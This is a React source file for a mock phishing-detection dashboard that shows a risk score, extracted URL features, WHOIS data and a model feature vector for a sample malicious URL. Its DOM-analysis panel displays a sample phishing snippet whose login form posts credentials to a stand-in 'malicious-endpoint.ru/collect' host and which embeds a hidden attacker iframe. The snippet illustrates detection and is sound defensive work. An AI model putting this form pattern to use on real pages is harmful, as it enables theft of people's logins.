import React, { useState } from 'react';

// --- DESIGN SYSTEM MAPPING ---
// Primary: #060819 (Backgrounds)
// Secondary: #aab3d8 (Text, Accents)
// Tertiary: #892401 (Alerts, Highlights)
// Neutral: #76767f (Borders, Muted Text)
// Fonts: font-display (Space Grotesk), font-sans (Inter), font-mono (Plus Jakarta Sans/Code)

const SafePhishDashboard = () => {
  const [searchQuery, setSearchQuery] = useState('');
  const [isMatrixExpanded, setIsMatrixExpanded] = useState(true);

  return (
    <div className="bg-[#060819] text-[#aab3d8] font-sans min-h-screen selection:bg-[#aab3d8] selection:text-[#060819] flex">
      {/* SideNavBar */}
      <aside className="fixed left-0 top-0 h-full flex flex-col bg-[#060819] w-64 border-r border-[#76767f]/20 shadow-2xl z-50">
        <div className="p-6">
          <div className="flex items-center gap-3">
            <div className="bg-[#aab3d8] p-1.5 rounded-md">
              <span className="material-symbols-outlined text-[#060819]" style={{ fontVariationSettings: "'FILL' 1" }}>
                security
              </span>
            </div>
            <div>
              <h1 className="text-2xl font-black text-white tracking-tighter" style={{ fontFamily: 'Space Grotesk, sans-serif' }}>SafePhish</h1>
              <p className="text-[10px] text-[#76767f] uppercase tracking-widest" style={{ fontFamily: 'Plus Jakarta Sans, sans-serif' }}>Cybersecurity Analytics</p>
            </div>
          </div>
        </div>
        
        <nav className="flex-1 mt-4 px-3 space-y-1" style={{ fontFamily: 'Plus Jakarta Sans, sans-serif' }}>
          {['dashboard', 'analytics'].map((item) => (
            <a key={item} href="#" className="flex items-center gap-3 px-4 py-3 rounded-lg text-[#76767f] hover:text-[#aab3d8] hover:bg-[#76767f]/10 transition-colors duration-200 active:scale-95">
              <span className="material-symbols-outlined">{item}</span>
              <span className="capitalize">{item.replace('_', ' ')}</span>
            </a>
          ))}
          
          {/* Active Navigation Item */}
          <a href="#" className="flex items-center gap-3 px-4 py-3 rounded-lg text-white bg-[#76767f]/10 border-l-4 border-[#aab3d8] font-bold active:scale-95 duration-100">
            <span className="material-symbols-outlined">psychology</span>
            <span>Explainability</span>
          </a>

          {['search_insights', 'report_problem', 'settings'].map((item) => (
            <a key={item} href="#" className="flex items-center gap-3 px-4 py-3 rounded-lg text-[#76767f] hover:text-[#aab3d8] hover:bg-[#76767f]/10 transition-colors duration-200 active:scale-95">
              <span className="material-symbols-outlined">{item}</span>
              <span className="capitalize">{item.replace('_', ' ')}</span>
            </a>
          ))}
        </nav>
        
        <div className="p-6 border-t border-[#76767f]/20">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-full bg-[#76767f]/20 flex items-center justify-center">
              <span className="material-symbols-outlined text-[#aab3d8] text-sm">person</span>
            </div>
            <div className="flex-1 overflow-hidden">
              <p className="text-xs font-bold text-[#aab3d8] truncate">Admin Terminal</p>
              <p className="text-[10px] text-[#76767f]">Node-04 Active</p>
            </div>
          </div>
        </div>
      </aside>

      {/* Main Content Wrapper */}
      <main className="ml-64 flex-1 pb-20 relative">
        {/* TopNavBar */}
        <header className="sticky top-0 z-40 bg-[#060819]/90 backdrop-blur-md flex justify-between items-center px-6 py-3 w-full border-b border-[#76767f]/20 transition-all duration-300">
          <div className="flex items-center gap-4">
            <div className="text-[#76767f] flex items-center gap-2">
              <span className="material-symbols-outlined text-sm">terminal</span>
              <span className="text-xs font-mono">analysis_engine/explain/id_9283</span>
            </div>
          </div>
          
          <div className="flex items-center gap-6">
            <div className="relative group">
              <span className="absolute inset-y-0 left-3 flex items-center text-[#76767f]">
                <span className="material-symbols-outlined text-sm">search</span>
              </span>
              <input 
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search incidents..." 
                className="bg-[#76767f]/10 border border-[#76767f]/30 rounded-lg text-xs pl-10 pr-4 py-2 w-64 focus:outline-none focus:border-[#aab3d8] text-[#aab3d8] transition-all"
              />
            </div>
            <div className="flex items-center gap-4 text-[#76767f]">
              <button className="hover:text-[#aab3d8] hover:bg-[#76767f]/10 p-2 rounded-lg transition-all duration-300">
                <span className="material-symbols-outlined">notifications</span>
              </button>
              <button className="hover:text-[#aab3d8] hover:bg-[#76767f]/10 p-2 rounded-lg transition-all duration-300">
                <span className="material-symbols-outlined">help_outline</span>
              </button>
            </div>
          </div>
        </header>

        <div className="p-8 space-y-8 max-w-7xl mx-auto">
          {/* Centerpiece: URL Verdict */}
          <section className="relative overflow-hidden rounded-xl bg-[#76767f]/5 border border-[#76767f]/20 p-1">
            <div className="absolute top-0 right-0 p-4 opacity-5 pointer-events-none">
              <span className="material-symbols-outlined text-[240px]" style={{ fontVariationSettings: "'FILL' 1" }}>warning</span>
            </div>
            
            <div className="relative z-10 bg-[#060819]/60 backdrop-blur-md p-10 rounded-lg flex flex-col md:flex-row items-center gap-12 border border-[#76767f]/10">
              {/* Score Circle */}
              <div className="relative flex-shrink-0">
                <svg className="w-48 h-48 transform -rotate-90">
                  <circle cx="96" cy="96" r="88" fill="transparent" stroke="#76767f" strokeWidth="8" className="opacity-20"></circle>
                  <circle cx="96" cy="96" r="88" fill="transparent" stroke="#892401" strokeWidth="8" strokeDasharray="552.92" strokeDashoffset="55.29"></circle>
                </svg>
                <div className="absolute inset-0 flex flex-col items-center justify-center">
                  <span className="text-5xl font-black text-white" style={{ fontFamily: 'Space Grotesk, sans-serif' }}>90%</span>
                  <span className="text-[10px] uppercase tracking-widest text-[#76767f]" style={{ fontFamily: 'Plus Jakarta Sans, sans-serif' }}>Risk Score</span>
                </div>
              </div>

              {/* URL Info */}
              <div className="flex-1 space-y-4">
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#892401]/10 border border-[#892401]/30 text-[#892401] text-xs font-bold uppercase tracking-widest">
                  <span className="material-symbols-outlined text-xs" style={{ fontVariationSettings: "'FILL' 1" }}>gpp_maybe</span>
                  Confirmed Phishing
                </div>
                
                <div className="space-y-1">
                  <h2 className="text-3xl font-black text-[#aab3d8] tracking-tight break-all leading-tight" style={{ fontFamily: 'Space Grotesk, sans-serif' }}>
                    http://sec-auth-portal-update.com/login/redirect?id=9283
                  </h2>
                  <p className="text-[#76767f] text-sm" style={{ fontFamily: 'Plus Jakarta Sans, sans-serif' }}>
                    Targeted spoofing attack detected via abnormal network patterns.
                  </p>
                </div>
                
                <div className="flex gap-4 pt-4" style={{ fontFamily: 'Plus Jakarta Sans, sans-serif' }}>
                  <button className="bg-[#892401] text-white px-6 py-2 rounded-md font-bold flex items-center gap-2 hover:bg-[#892401]/80 transition-all">
                    <span className="material-symbols-outlined text-sm">block</span>
                    Blacklist Domain
                  </button>
                  <button className="bg-[#76767f]/20 text-[#aab3d8] px-6 py-2 rounded-md font-bold flex items-center gap-2 hover:bg-[#76767f]/40 transition-all">
                    <span className="material-symbols-outlined text-sm">share</span>
                    Report IOC
                  </button>
                </div>
              </div>
            </div>
          </section>

          {/* Explainability Section */}
          <section className="space-y-4">
            <div className="flex justify-between items-center">
              <h3 className="text-xl font-bold flex items-center gap-2 text-white" style={{ fontFamily: 'Space Grotesk, sans-serif' }}>
                <span className="text-[#aab3d8]">#</span> Feature Explainability Matrix
              </h3>
              <div className="flex gap-2">
                <span className="flex items-center gap-1.5 text-[10px] text-[#76767f] bg-[#76767f]/10 px-3 py-1 rounded-md">
                  <span className="w-1.5 h-1.5 rounded-full bg-[#892401]"></span> Flagged
                </span>
                <span className="flex items-center gap-1.5 text-[10px] text-[#76767f] bg-[#76767f]/10 px-3 py-1 rounded-md">
                  <span className="w-1.5 h-1.5 rounded-full bg-[#76767f]"></span> Neutral
                </span>
                <span className="flex items-center gap-1.5 text-[10px] text-[#76767f] bg-[#76767f]/10 px-3 py-1 rounded-md">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span> Safe
                </span>
              </div>
            </div>

            <div className="bg-[#060819] border border-[#76767f]/30 rounded-xl overflow-hidden">
              <div 
                className="flex items-center justify-between p-4 cursor-pointer bg-[#76767f]/10 hover:bg-[#76767f]/20 transition-colors"
                onClick={() => setIsMatrixExpanded(!isMatrixExpanded)}
              >
                <div className="flex items-center gap-3">
                  <span className="material-symbols-outlined text-[#aab3d8]">list_alt</span>
                  <span className="font-bold text-sm" style={{ fontFamily: 'Plus Jakarta Sans, sans-serif' }}>View All 30 Extracted Features</span>
                </div>
                <span className={`material-symbols-outlined transition-transform duration-300 ${isMatrixExpanded ? 'rotate-180' : ''}`}>expand_more</span>
              </div>
              
              {isMatrixExpanded && (
                <div className="p-1 max-h-[600px] overflow-y-auto custom-scrollbar">
                  <table className="w-full text-left border-collapse">
                    <thead className="sticky top-0 bg-[#060819] z-10">
                      <tr className="text-[10px] uppercase tracking-widest text-[#76767f] border-b border-[#76767f]/20">
                        <th className="p-4">Feature Name</th>
                        <th className="p-4">Description</th>
                        <th className="p-4 text-center">Status</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-[#76767f]/10 text-sm" style={{ fontFamily: 'Plus Jakarta Sans, sans-serif' }}>
                      {[
                        { name: 'AbnormalURL', desc: 'URL structure does not match host communication patterns.', status: 'flagged' },
                        { name: 'AgeofDomain', desc: 'Domain was registered less than 30 days ago.', status: 'flagged' },
                        { name: 'AnchorURL', desc: 'High percentage of anchors link to different domains.', status: 'neutral' },
                        { name: 'HTTPS', desc: 'Connection is encrypted but lacks extended validation.', status: 'safe' },
                        { name: 'Symbol@', desc: 'Presence of @ symbol in URL indicates credential baiting.', status: 'flagged' },
                        { name: 'SubDomains', desc: 'Multiple subdomains detected (auth, portal, update).', status: 'flagged' },
                      ].map((feature, idx) => (
                        <tr key={idx} className="hover:bg-[#76767f]/5 transition-colors">
                          <td className="p-4 font-mono text-[#aab3d8]">{feature.name}</td>
                          <td className="p-4 text-[#76767f]">{feature.desc}</td>
                          <td className="p-4 text-center">
                            {feature.status === 'flagged' && (
                              <span className="inline-flex items-center justify-center w-6 h-6 rounded bg-[#892401]/20 text-[#892401]">
                                <span className="material-symbols-outlined text-sm">warning</span>
                              </span>
                            )}
                            {feature.status === 'neutral' && (
                              <span className="inline-flex items-center justify-center w-6 h-6 rounded bg-[#76767f]/20 text-[#76767f]">
                                <span className="material-symbols-outlined text-sm">horizontal_rule</span>
                              </span>
                            )}
                            {feature.status === 'safe' && (
                              <span className="inline-flex items-center justify-center w-6 h-6 rounded bg-emerald-500/20 text-emerald-500">
                                <span className="material-symbols-outlined text-sm">check_circle</span>
                              </span>
                            )}
                          </td>
                        </tr>
                      ))}
                      <tr className="bg-[#76767f]/5 italic">
                        <td colSpan="3" className="p-4 text-center text-xs text-[#76767f]">
                          ... remaining 24 features (DNSRecording, GoogleIndex, LinksInScriptTags, etc.) listed in full audit ...
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          </section>

          {/* Advanced Analysis Section */}
          <section className="space-y-4">
            <h3 className="text-xl font-bold flex items-center gap-2 text-white" style={{ fontFamily: 'Space Grotesk, sans-serif' }}>
              <span className="text-[#aab3d8]">#</span> FeatureExtraction Foundation
            </h3>
            
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              {/* Primary Identifiers */}
              <div className="bg-[#76767f]/10 border border-[#76767f]/20 rounded-xl p-5 space-y-4">
                <div className="flex items-center gap-2 text-[#aab3d8]">
                  <span className="material-symbols-outlined text-lg">link</span>
                  <span className="font-bold text-xs uppercase tracking-wider">Identifiers</span>
                </div>
                <div className="space-y-3 font-mono text-xs">
                  <div className="bg-[#060819] p-3 rounded-md border border-[#76767f]/30">
                    <p className="text-[#76767f] mb-1">self.url</p>
                    <p className="text-white break-all leading-relaxed">http://sec-auth-portal-update.com/login/redirect?id=9283</p>
                  </div>
                  <div className="bg-[#060819] p-3 rounded-md border border-[#76767f]/30">
                    <p className="text-[#76767f] mb-1">self.domain</p>
                    <p className="text-[#aab3d8]">sec-auth-portal-update.com</p>
                  </div>
                </div>
              </div>

              {/* URL Parsing */}
              <div className="bg-[#76767f]/10 border border-[#76767f]/20 rounded-xl p-5 space-y-4">
                <div className="flex items-center gap-2 text-[#aab3d8]">
                  <span className="material-symbols-outlined text-lg">account_tree</span>
                  <span className="font-bold text-xs uppercase tracking-wider">URL Parse Tree</span>
                </div>
                <div className="space-y-2 font-mono text-xs">
                  <div className="flex justify-between p-2 bg-[#060819] rounded-md border border-[#76767f]/30">
                    <span className="text-[#76767f]">scheme</span>
                    <span className="text-white">http</span>
                  </div>
                  <div className="flex justify-between p-2 bg-[#060819] rounded-md border border-[#76767f]/30">
                    <span className="text-[#76767f]">netloc</span>
                    <span className="text-white">sec-auth-portal-update.com</span>
                  </div>
                  <div className="flex justify-between p-2 bg-[#060819] rounded-md border border-[#76767f]/30">
                    <span className="text-[#76767f]">path</span>
                    <span className="text-white">/login/redirect</span>
                  </div>
                </div>
              </div>

              {/* WHOIS Data */}
              <div className="bg-[#76767f]/10 border border-[#76767f]/20 rounded-xl p-5 space-y-4">
                <div className="flex items-center gap-2 text-[#aab3d8]">
                  <span className="material-symbols-outlined text-lg">badge</span>
                  <span className="font-bold text-xs uppercase tracking-wider">WHOIS ID Card</span>
                </div>
                <div className="space-y-2 text-xs">
                  <div className="bg-[#060819] p-2 rounded-md border border-[#76767f]/30 flex flex-col gap-1">
                    <span className="text-[#76767f] font-mono">Creation Date</span>
                    <span className="text-[#892401] font-bold">2024-05-12T08:22:11Z (2 days ago)</span>
                  </div>
                  <div className="bg-[#060819] p-2 rounded-md border border-[#76767f]/30 flex flex-col gap-1">
                    <span className="text-[#76767f] font-mono">Expiration</span>
                    <span className="text-white">2025-05-12T08:22:11Z</span>
                  </div>
                  <div className="bg-[#060819] p-2 rounded-md border border-[#76767f]/30 flex flex-col gap-1">
                    <span className="text-[#76767f] font-mono">Registrar</span>
                    <span className="text-white">DomainCheap Inc.</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Bottom Analysis Row */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="bg-[#76767f]/10 border border-[#76767f]/20 rounded-xl p-6 space-y-4">
                <div className="flex justify-between items-center">
                  <div className="flex items-center gap-2 text-[#aab3d8]">
                    <span className="material-symbols-outlined text-lg">html</span>
                    <span className="font-bold text-xs uppercase tracking-wider">self.soup (DOM Analysis)</span>
                  </div>
                  <span className="text-[10px] text-[#76767f] font-mono">1.2MB Captured</span>
                </div>
                <div className="bg-[#060819] rounded-lg p-4 font-mono text-[11px] leading-relaxed text-[#76767f] overflow-hidden h-[240px] border border-[#76767f]/30 relative">
                  <span className="text-emerald-500">&lt;html&gt;</span><br />
                  &nbsp;&nbsp;<span className="text-emerald-500">&lt;head&gt;</span><br />
                  &nbsp;&nbsp;&nbsp;&nbsp;<span className="text-emerald-500">&lt;script&gt;</span><br />
                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;window.oncontextmenu = <span className="text-[#aab3d8]">function() {'{ return false; }'}</span>; <span className="text-[#76767f] opacity-70">// DisableRightClick=1</span><br />
                  &nbsp;&nbsp;&nbsp;&nbsp;<span className="text-emerald-500">&lt;/script&gt;</span><br />
                  &nbsp;&nbsp;<span className="text-emerald-500">&lt;/head&gt;</span><br />
                  &nbsp;&nbsp;<span className="text-emerald-500">&lt;body&gt;</span><br />
                  &nbsp;&nbsp;&nbsp;&nbsp;<span className="text-emerald-500">&lt;form</span> action="http://malicious-endpoint.ru/collect" method="POST"<span className="text-emerald-500">&gt;</span> <span className="text-[#76767f] opacity-70">// SFH=1</span><br />
                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span className="text-emerald-500">&lt;input</span> type="text" name="usr" placeholder="Enter Login"<span className="text-emerald-500">&gt;</span><br />
                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span className="text-emerald-500">&lt;iframe</span> src="https://attacker-frame.com" style="display:none" <span className="text-emerald-500">&gt;&lt;/iframe&gt;</span><br />
                </div>
              </div>

              <div className="bg-[#76767f]/10 border border-[#76767f]/20 rounded-xl p-6 space-y-4">
                <div className="flex justify-between items-center">
                  <div className="flex items-center gap-2 text-[#aab3d8]">
                    <span className="material-symbols-outlined text-lg">data_object</span>
                    <span className="font-bold text-xs uppercase tracking-wider">self.features (XGBoost Vector)</span>
                  </div>
                  <span className="text-[10px] text-[#76767f] font-mono">Input Dim: 30x1</span>
                </div>
                <div className="bg-[#060819] rounded-lg p-6 font-mono text-[13px] border border-[#76767f]/30 flex flex-col justify-center h-[240px]">
                  <p className="text-[#76767f] mb-4 font-mono text-xs">Vector construction for model inference:</p>
                  <div className="bg-[#76767f]/20 p-4 rounded-md text-[#aab3d8] font-bold tracking-widest break-all">
                    [1, -1, 0, 1, 1, 1, 1, -1, 0, -1, 1, -1, 1, 1, 1, -1, -1, -1, 1, 1, 1, -1, 0, 1, 1, 1, -1, 1, 1, 1]
                  </div>
                  <div className="flex justify-between mt-4 text-[10px] text-[#76767f] uppercase tracking-widest">
                    <span>Idx 0: AbnormalURL</span>
                    <span>Idx 29: Traffic</span>
                  </div>
                </div>
              </div>
            </div>
          </section>
        </div>

        {/* Footer */}
        <footer className="absolute bottom-0 right-0 border-t border-[#76767f]/20 bg-[#060819] flex justify-between items-center px-6 py-3 w-full z-40">
          <div className="flex items-center gap-4">
            <span className="text-[#76767f] text-xs uppercase tracking-widest" style={{ fontFamily: 'Plus Jakarta Sans, sans-serif' }}>© 2024 SafePhish Sentinel System</span>
          </div>
          <div className="flex items-center gap-6">
            <div className="flex items-center gap-2 text-emerald-500 text-xs uppercase tracking-widest" style={{ fontFamily: 'Plus Jakarta Sans, sans-serif' }}>
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
              System Status: Operational
            </div>
            <span className="text-[#76767f] text-xs uppercase tracking-widest" style={{ fontFamily: 'Plus Jakarta Sans, sans-serif' }}>v2.4.0-Stable</span>
          </div>
        </footer>
      </main>
    </div>
  );
};

export default SafePhishDashboard;